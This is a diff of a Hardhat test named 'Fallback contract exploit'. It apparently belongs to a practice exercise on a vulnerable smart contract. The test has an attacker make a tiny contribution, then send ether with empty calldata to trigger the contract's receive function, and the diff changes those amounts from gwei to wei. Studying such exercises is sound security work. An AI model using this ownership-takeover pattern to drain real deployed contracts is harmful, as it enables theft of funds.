@@ -13,20 +13,21 @@ describe("Fallback contract exploit", () => {
   it("Should drain the contract", async () => {
     const { deployer, attacker, fallback } = await loadFixture(deployFallbackFixture);
 
-    // Add contributions to the contract
+    // Add contribution to the contract
     await fallback.connect(deployer).contribute({
       value: ethers.utils.parseUnits("100", "gwei"),
     });
 
+    // Add contribution to the contract from attacker
     await fallback.connect(attacker).contribute({
-      value: ethers.utils.parseUnits("1", "gwei"),
+      value: ethers.utils.parseUnits("1", "wei"),
     });
 
     // Send ether to contract without specifying msg.data
     // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
     const txReceipt = await attacker.sendTransaction({
       to: fallback.address,
-      value: ethers.utils.parseUnits("1", "gwei"),
+      value: ethers.utils.parseUnits("1", "wei"),
     });
     await txReceipt.wait();
 
